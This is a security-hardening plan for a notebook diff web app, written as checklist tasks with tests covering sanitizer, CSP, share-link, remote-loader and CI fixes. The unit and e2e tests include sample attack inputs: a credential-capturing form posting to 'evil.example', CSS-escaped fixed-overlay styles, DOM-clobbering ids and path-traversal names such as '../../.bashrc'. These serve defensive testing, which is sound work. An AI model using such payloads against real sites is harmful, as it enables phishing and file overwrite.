# Security Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close findings S1–S9 from the 2026-11-02 security audit without breaking any current feature.

**Architecture:** Defence in depth at each layer an attacker's input passes through: decode (share/bundle validation), render (hardened DOMPurify instance + CSS containment), browser policy (CSP), and build (least-privilege CI with pinned actions). No new runtime dependencies.

**Tech Stack:** Svelte 5 runes, TypeScript strict, DOMPurify, lz-string, Vitest (jsdom for DOM tests), Playwright, GitHub Actions.

**Spec:** `docs/superpowers/specs/2026-11-02-security-audit.md`

## Global Constraints

- Exact pinned dependency versions only (no `^`/`~`); each version published ≥ 14 days before adoption.
- `src/core/` stays pure TypeScript: no `window`, `document`, `fetch` in core modules except the existing `remote.ts`.
- Initial JS bundle ≤ 250 KB (`npm run size`).
- Keep `script-src 'self'`; no inline scripts or handlers.
- Single quotes, semicolons, no trailing commas, 100-char lines (`npm run lint` must pass).
- WCAG 2.1 AA: the existing axe tests must stay green.
- Every task ends with the full gate passing: `npm run lint && npm run typecheck && npm test && npm run test:perf && npm run build && npm run size && npm run test:e2e`.
- Do not push the audit spec or this plan to the public repo before Tasks 1–3 are merged. Ship them in the same push as the fixes.

## Review Focus

1. **KaTeX math in markdown must still render** after sanitizer hardening (inline `style` with `height`/`vertical-align`/`top` must survive). Test in Task 2.
2. **CSS-escaped positioning** (`posit\69on: fixed`) must be neutralised. Pinned in Task 2 via the CSSOM check plus the containment e2e.
3. **Legitimate old share links** (≤ 8 KB, created by the current encoder) must still open with their options applied. Test in Task 4.
4. **Raw GitHub URLs** (`https://raw.githubusercontent.com/...`) must still load after remote-loader hardening, including files just under 50 MB. Test in Task 5.
5. **Markdown links** must open in a new tab without losing the diff, and relative `#anchor` links must keep working in place. Test in Task 2.

---

### Task 1: Upgrade DOMPurify (S2)

**Files:**
- Modify: `package.json` (`"dompurify": "3.4.17"`), `package-lock.json`
- Test: `tests/unit/security.test.ts` (existing suite must pass unchanged)

**Interfaces:**
- Produces: `dompurify@3.4.17` available to Task 2.

- [ ] **Step 1: Confirm the advisory is present**
  Run: `npm audit --omit=dev --audit-level=high`
  Expected: exit 1, `dompurify` listed as high.
- [ ] **Step 2: Pin the new version**
  Run: `npm install dompurify@3.4.17 --save-exact`
  Remove `@types/dompurify` if 3.4.x ships its own types (check `node_modules/dompurify/dist/purify.es.d.mts`). Keep it only if `npm run typecheck` fails without it.
- [ ] **Step 3: Verify**
  Run: `npm audit --omit=dev --audit-level=high` → exit 0. Run the full gate → all green.
- [ ] **Step 4: Commit**
  `git commit -m "fix(deps): upgrade dompurify to 3.4.17 (GHSA-h8r8-wccr-v5f2 et al.)"`

---

### Task 2: Hardened markdown sanitizer + containment (S1, S4, S8)

**Files:**
- Modify: `src/ui/nb-view/renderers/markdown.ts` (replace `sanitizeHtml`)
- Modify: `src/ui/nb-view/CellCard.svelte` (`.rendered-prose` style block, ~line 623)
- Test: `tests/unit/security.test.ts` (add cases), `tests/e2e/security.spec.ts` (create)

**Interfaces:**
- Consumes: DOMPurify 3.4.17 (Task 1).
- Produces: `export function sanitizeHtml(html: string): string` (now **synchronous**; update the one caller in `renderMarkdown`). `export const FORBIDDEN_MARKDOWN_TAGS: readonly string[]`.

- [ ] **Step 1: Write failing unit tests** (append to `tests/unit/security.test.ts`, jsdom env)

```ts
it('removes forms and form controls', async () => {
  const html = await renderMarkdown(
    '<form action="https://evil.example/c"><input type="password" name="p"><button>Go</button></form>'
  );
  expect(html).not.toMatch(/<form|<input|<button/);
});
it('strips fixed/absolute/sticky positioning, including CSS escapes', async () => {
  for (const s of ['position:fixed', 'position: absolute', 'posit\\69on:fixed', 'position:sticky']) {
    const html = await renderMarkdown(`<div style="${s};inset:0">x</div>`);
    expect(html).not.toMatch(/fixed|absolute|sticky/);
  }
});
it('keeps relative positioning and KaTeX inline styles', async () => {
  const html = await renderMarkdown('$$\\frac{a}{b}$$\n\n<span style="position:relative;top:1px">r</span>');
  expect(html).toContain('class="katex');
  expect(html).toMatch(/style="[^"]*vertical-align/);
  expect(html).toMatch(/position:\s*relative/);
});
it('drops <style> elements', async () => {
  expect(await renderMarkdown('<style>body{display:none}</style>ok')).not.toContain('<style');
});
it('opens external links in a new tab safely, leaves anchors alone', async () => {
  const ext = await renderMarkdown('[d](https://example.com)');
  expect(ext).toContain('target="_blank"');
  expect(ext).toContain('rel="noopener noreferrer"');
  const anchor = await renderMarkdown('[s](#section)');
  expect(anchor).not.toContain('target=');
});
it('namespaces id/name to prevent DOM clobbering', async () => {
  const html = await renderMarkdown('<img id="app" name="settings" src="data:image/png;base64,AA==">');
  expect(html).toContain('id="user-content-app"');
  expect(html).not.toMatch(/\bid="app"/);
});
it('fails closed: escapes html when no sanitizer is available', () => {
  expect(escapeHtmlFallback('<b onclick=x>t</b>')).toBe('&lt;b onclick=x&gt;t&lt;/b&gt;');
});
```

- [ ] **Step 2: Run, confirm failures**
  Run: `npx vitest run tests/unit/security.test.ts` → the 7 new tests FAIL.
- [ ] **Step 3: Implement in `markdown.ts`**
  - Module-level: `const purify = typeof window !== 'undefined' ? DOMPurify(window) : null;`, a single instance so the hooks can't leak into other users of DOMPurify.
  - `FORBIDDEN_MARKDOWN_TAGS = ['form', 'input', 'button', 'textarea', 'select', 'option', 'style']`.
  - Config: `{ FORBID_TAGS: [...FORBIDDEN_MARKDOWN_TAGS], SANITIZE_NAMED_PROPS: true }`.
  - Hook `afterSanitizeAttributes`: (a) if `node instanceof HTMLElement && node.style.position` and the value is not `static`/`relative`, call `node.style.removeProperty('position')`, then remove the `style` attribute if it's now empty. Use the CSSOM, never a regex. (b) If `node.tagName === 'A'` and `href` doesn't start with `#`, set `target="_blank"` and `rel="noopener noreferrer"`. Attributes set in this hook are not re-sanitized, so don't add `target` to `ADD_ATTR` (that would let attacker-supplied `target` values through on `#` links).
  - `export function escapeHtmlFallback(s: string): string`: replaces `& < > " '`.
  - `sanitizeHtml(html)`: `purify ? purify.sanitize(html, CONFIG) : (console.warn(...), escapeHtmlFallback(html))`.
- [ ] **Step 4: Containment CSS** in `CellCard.svelte` `.rendered-prose`: add `position: relative; contain: layout paint; overflow: auto;`.
- [ ] **Step 5: Write the e2e regression** `tests/e2e/security.spec.ts`: build the S1 proof-of-concept share link in the test (notebook with one markdown cell containing the fixed overlay and form, compressed with `lz-string`'s `compressToEncodedURIComponent`). `page.goto('./#s=' + data)`, wait for `.cell-card`, then assert:
  - `page.locator('.rendered-prose form')` has count 0;
  - `await page.evaluate(() => !document.elementFromPoint(innerWidth / 2, innerHeight / 2)?.closest('.rendered-prose [style]'))` is `true`;
  - `page.route('https://evil.example/**')` handler never called.
- [ ] **Step 6: Run** `npx vitest run tests/unit/security.test.ts` → PASS; the full gate → green (axe included).
- [ ] **Step 7: Commit** `git commit -m "fix(security): harden markdown sanitizer and contain rendered cells (S1, S4, S8)"`

---

### Task 3: Tighten CSP (S1, S6)

**Files:**
- Modify: `index.html` (CSP meta)
- Test: `tests/unit/csp.test.ts` (create, node env)

**Interfaces:** none.

- [ ] **Step 1: Failing test** that reads `index.html` with `fs`, extracts the CSP `content`, splits it into a directive map, and asserts:

```ts
expect(csp['form-action']).toEqual(["'none'"]);
expect(csp['frame-src']).toEqual(["'self'", 'blob:']);
expect(csp['script-src']).toEqual(["'self'"]);
expect(csp['object-src']).toEqual(["'none'"]);
expect(csp['base-uri']).toEqual(["'self'"]);
```

- [ ] **Step 2: Run** `npx vitest run tests/unit/csp.test.ts` → FAIL on `form-action` and `frame-src`.
- [ ] **Step 3: Edit the meta:** append `form-action 'none';`, change `frame-src 'self' blob: data:` to `frame-src 'self' blob:`. Leave the other directives alone (residual risk is documented in the spec).
- [ ] **Step 4: Verify** unit test PASS. Full gate green: notebook HTML outputs still render (they use `srcdoc`, which `frame-src` doesn't govern), and the image diff still works.
- [ ] **Step 5: Commit** `git commit -m "fix(csp): add form-action 'none' and drop data: frames (S6)"`

---

### Task 4: Validate share links and bundles (S5, S9)

**Files:**
- Modify: `src/core/share.ts`, `src/core/patch.ts`, `src/App.svelte` (lines ~137–142 and ~257–262: use the sanitized options)
- Test: `tests/unit/share.test.ts`, `tests/unit/patch.test.ts`

**Interfaces:**
- Produces (in `share.ts`):
  - `export const MAX_SHARE_ENCODED_CHARS = 16384;`
  - `export const MAX_SHARE_DECODED_CHARS = 10 * 1024 * 1024;`
  - `export function sanitizeShareOptions(mode: 'text' | 'notebook', raw: unknown): Partial<NbDiffOptions>`: keeps only known keys with valid types: booleans for the `ignore*`/`hide*`/`includeOutputs` flags, `granularity ∈ {'word','char'}`, `similarityThreshold` a finite number in `[0.3, 0.9]` (the slider's range in `NbFilterBar.svelte`). Drops `similarityThreshold`/`hide*`/`includeOutputs` when mode is `'text'`.
  - `SharePayload.options` type changes to `Partial<NbDiffOptions> | undefined`. `decodeSharePayload` and `parseDiffBundle` both return sanitized options and only keep string `fileNameA/B` of ≤ 255 chars (otherwise `undefined`).
- Produces (in `patch.ts`): `export function safePatchPath(name: string | undefined): string`.

- [ ] **Step 1: Failing tests** (`share.test.ts`)

```ts
it('rejects oversized encoded data without decompressing', () => {
  expect(decodeSharePayload('#s=' + 'A'.repeat(MAX_SHARE_ENCODED_CHARS + 1))).toBeNull();
});
it('rejects payloads that decompress past the cap', () => {
  const a = 'A'.repeat(MAX_SHARE_DECODED_CHARS);
  const data = LZString.compressToEncodedURIComponent(JSON.stringify({ mode: 'text', a, b: a }));
  expect(data.length).toBeLessThan(MAX_SHARE_ENCODED_CHARS);
  expect(decodeSharePayload('#s=' + data)).toBeNull();
});
it('allow-lists and type-checks options', () => {
  const p = roundTrip({ mode: 'text', a: 'x', b: 'y',
    options: { granularity: 42, ignoreCase: true, similarityThreshold: 0.7, evil: 1 } });
  expect(p?.options).toEqual({ ignoreCase: true });
});
it('drops non-string or overlong file names', () => {
  expect(roundTrip({ mode: 'text', a: '', b: '', fileNameA: { x: 1 } as never })?.fileNameA).toBeUndefined();
  expect(roundTrip({ mode: 'text', a: '', b: '', fileNameA: 'f'.repeat(256) })?.fileNameA).toBeUndefined();
});
it('still opens a legitimate 8 KB link with options', () => {
  const ok = encodeSharePayload({ mode: 'notebook', a: '{}', b: '{}', options: { similarityThreshold: 0.6 } });
  expect(decodeSharePayload('#s=' + ok.compressed)?.options).toEqual({ similarityThreshold: 0.6 });
});
it('parseDiffBundle applies the same sanitization', () => {
  expect(parseDiffBundle(JSON.stringify({ mode: 'text', a: '', b: '', options: { granularity: 'x' } })).options).toEqual({});
});
```

  `roundTrip(p)` is a local helper: `decodeSharePayload('#s=' + LZString.compressToEncodedURIComponent(JSON.stringify(p)))`.

  (`patch.test.ts`)

```ts
it.each([
  ['../../.bashrc', '.bashrc'], ['/etc/hosts', 'etc/hosts'], ['a/./b/../c.py', 'a/c.py'],
  ['bad\u0000\nname.py', 'badname.py'], ['', 'file.txt'], [undefined, 'file.txt'], ['..', 'file.txt']
])('safePatchPath(%j) → %s', (input, out) => expect(safePatchPath(input)).toBe(out));
```

- [ ] **Step 2: Run** `npx vitest run tests/unit/share.test.ts tests/unit/patch.test.ts` → new tests FAIL.
- [ ] **Step 3: Implement.** In `decodeSharePayload`: check the length before `decompressFromEncodedURIComponent`, and check `decompressed.length` before `JSON.parse`. Route both decoders through one private `validatePayload(parsed: unknown): SharePayload | null`. `safePatchPath` resolves `.`/`..` segments on a stack (pop on `..`, never above root), strips C0 control chars and leading slashes, and returns `'file.txt'` if nothing is left. `generateGitPatch` uses it for the name.
- [ ] **Step 4: App.svelte:** the existing spreads now receive sanitized `Partial<…>` values. Remove the `as Partial<…>` casts so the types are checked.
- [ ] **Step 5: Run** the targeted tests → PASS; full gate green (including `features.spec.ts` share-link tests).
- [ ] **Step 6: Commit** `git commit -m "fix(security): cap and validate share links and bundles; normalise patch paths (S5, S9)"`

---

### Task 5: Harden the remote loader (S7)

**Files:**
- Modify: `src/core/remote.ts`, `src/core/file-reader.ts` (export `MAX_FILE_SIZE`)
- Test: `tests/unit/remote.test.ts`

**Interfaces:**
- Consumes: `export const MAX_FILE_SIZE` from `file-reader.ts`.
- Produces: `fetchRemoteFile(urlStr: string): Promise<RemoteFileResult>` (signature unchanged). New error message constant `export const REMOTE_TOO_LARGE_MESSAGE = 'This file is larger than 50 MB. Download it and upload it instead.';`.

- [ ] **Step 1: Failing tests** (mock `globalThis.fetch` with `vi.fn`)

```ts
it('rejects http:', async () => {
  await expect(fetchRemoteFile('http://example.com/a.py')).rejects.toThrow(/HTTPS/);
});
it('fetches without credentials or referrer', async () => {
  await fetchRemoteFile('https://raw.githubusercontent.com/o/r/main/a.py');
  expect(fetchMock).toHaveBeenCalledWith(expect.any(String),
    expect.objectContaining({ credentials: 'omit', referrerPolicy: 'no-referrer' }));
});
it('aborts once the body passes MAX_FILE_SIZE', async () => {
  fetchMock.mockResolvedValue(new Response(streamOfBytes(MAX_FILE_SIZE + 1)));
  await expect(fetchRemoteFile('https://x.test/big.txt')).rejects.toThrow(REMOTE_TOO_LARGE_MESSAGE);
});
it('accepts a body just under the cap', async () => {
  fetchMock.mockResolvedValue(new Response(streamOfBytes(MAX_FILE_SIZE - 1)));
  await expect(fetchRemoteFile('https://x.test/ok.txt')).resolves.toMatchObject({ fileName: 'ok.txt' });
});
```

  `streamOfBytes(n)` is a test helper returning a `ReadableStream` of `n` bytes in 1 MiB chunks of `'a'`.

- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Implement.** Allow `https:` only (message: `'Invalid URL: only HTTPS is supported.'`). Call `fetch(url, { credentials: 'omit', referrerPolicy: 'no-referrer' })`. Reject early if `Content-Length` > cap. Otherwise read `res.body` with a reader, count bytes, `reader.cancel()` and throw `REMOTE_TOO_LARGE_MESSAGE` past the cap, then decode with `decodeFileBuffer` (reusing the binary check). Let `REMOTE_TOO_LARGE_MESSAGE` and `DiffError` (binary file) pass through the existing catch the way `CORS_ERROR_MESSAGE` does. Today every other error is rewritten to the CORS message.
- [ ] **Step 4: Run** → PASS; full gate green.
- [ ] **Step 5: Commit** `git commit -m "fix(security): https-only, credential-free, size-capped remote loader (S7)"`

---

### Task 6: Least-privilege, pinned CI/CD (S3)

**Files:**
- Modify: `.github/workflows/deploy.yml`, `.github/workflows/ci.yml`
- Create: `.github/dependabot.yml`

**Interfaces:** none.

- [ ] **Step 1: Permissions.** `deploy.yml`: move `permissions` to job level: `checks: { contents: read }`, `deploy: { contents: read, pages: write, id-token: write }`. Set the top-level `permissions: {}`. `ci.yml`: add top-level `permissions: { contents: read }`.
- [ ] **Step 2: Pin actions to commit SHAs** (resolved 2026-11-02 with `git ls-remote`, peeled tags). Same majors as today, so behaviour doesn't change:

| Action | Pin |
|---|---|
| `actions/checkout` | `11d5960a326750d5838078e36cf38b85af677262 # v4.4.0` |
| `actions/setup-node` | `49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0` |
| `actions/upload-artifact` | `ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2` |
| `actions/configure-pages` | `983d7736d9b0ae728b81ab479565c72886d7745b # v5.0.0` |
| `actions/upload-pages-artifact` | `56afc609e74202658d3ffba0e8f6dda462b719fa # v3.0.1` |
| `actions/deploy-pages` | `d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e # v4.0.5` |

  Re-verify each SHA before committing: `git ls-remote https://github.com/actions/<name> 'refs/tags/<tag>^{}'`.
- [ ] **Step 3: Audit gate.** In both workflows, after `npm ci`: `- name: Audit runtime dependencies` / `run: npm audit --omit=dev --audit-level=high`.
- [ ] **Step 4: Dependabot** `.github/dependabot.yml`: `version: 2`; ecosystems `npm` (`/`, weekly, `groups: dev-tooling: { dependency-type: development }`) and `github-actions` (`/`, weekly). Add `cooldown: { default-days: 14 }` to the npm entry so updates respect the 14-day rule.
- [ ] **Step 5: Verify.**
  - `npx --yes yaml-lint .github/workflows/*.yml .github/dependabot.yml` → valid.
  - `grep -nE 'uses: [^@]+@v[0-9]' .github/workflows/*.yml` → no output.
  - `grep -n 'id-token' .github/workflows/deploy.yml` → only under `deploy:`.
  - After pushing: Actions shows `checks` and `deploy` green.
- [ ] **Step 6: Commit** `git commit -m "ci(security): least-privilege permissions, SHA-pinned actions, audit gate, dependabot (S3)"`

---

### Task 7: Privacy copy and docs (S10, S11)

**Files:**
- Modify: `src/ui/ShareModal.svelte` (~line 110), `src/ui/InputPanel.svelte` (~line 397, remember-inputs label), `SECURITY.md`, `README.md` (link to SECURITY.md)
- Test: `tests/e2e/features.spec.ts` (extend the share test)

**Interfaces:** none.

- [ ] **Step 1: Failing e2e assertions:** the share modal contains `"stays in your browser history"`, and the remember-inputs control has `title` or helper text containing `"plain text"`.
- [ ] **Step 2: Run** `npm run test:e2e -- features.spec.ts` → FAIL.
- [ ] **Step 3: Copy changes.**
  - Share notice: `Anyone with this link can read both inputs. The link also stays in your browser history.`
  - Remember hint: `Saved as plain text in this browser. Don't use on shared computers.`
- [ ] **Step 4: Update `SECURITY.md`:** move S1–S9 to "Fixed" with version/commit. Run humanizer on the changed prose.
- [ ] **Step 5: Run** the full gate → green.
- [ ] **Step 6: Commit** `git commit -m "docs(security): privacy notices and SECURITY.md update (S10, S11)"`
